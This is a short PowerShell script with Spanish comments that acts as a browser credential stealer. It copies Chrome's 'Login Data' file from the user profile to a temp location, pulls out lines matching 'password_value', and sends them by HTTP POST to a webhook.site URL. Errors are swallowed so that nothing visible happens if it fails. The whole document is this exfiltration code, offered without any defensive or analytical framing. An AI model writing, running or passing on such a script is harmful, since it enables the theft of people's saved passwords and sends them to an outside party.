# Ruta de los datos de Chrome
$path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
$tempPath = "$env:TEMP\chrome_data_copy.db"

if (Test-Path $path) {
    try {
        # Intentamos copiar el archivo a una ubicación temporal para saltar el bloqueo de lectura
        # Si Chrome está abierto, esto puede fallar, por eso usamos un bloque Try/Catch
        Copy-Item $path $tempPath -ErrorAction SilentlyContinue
        
        if (Test-Path $tempPath) {
            # Leemos el archivo copiado
            $data = Get-Content $tempPath -Raw | Select-String "password_value"
            
            if ($data) {
                # Enviamos los datos al Webhook
                $payload = [System.Text.Encoding]::UTF8.GetBytes($data)
                Invoke-WebRequest -UseBasicParsing -Uri 'https://webhook.site/c712d334-352a-4bea-b44b-9d94dbe4dede' -Method POST -Body $payload
            }
        }
    }
    catch {
        # Si falla por estar bloqueado, el script simplemente no hará nada (evita errores visibles)
    }
}
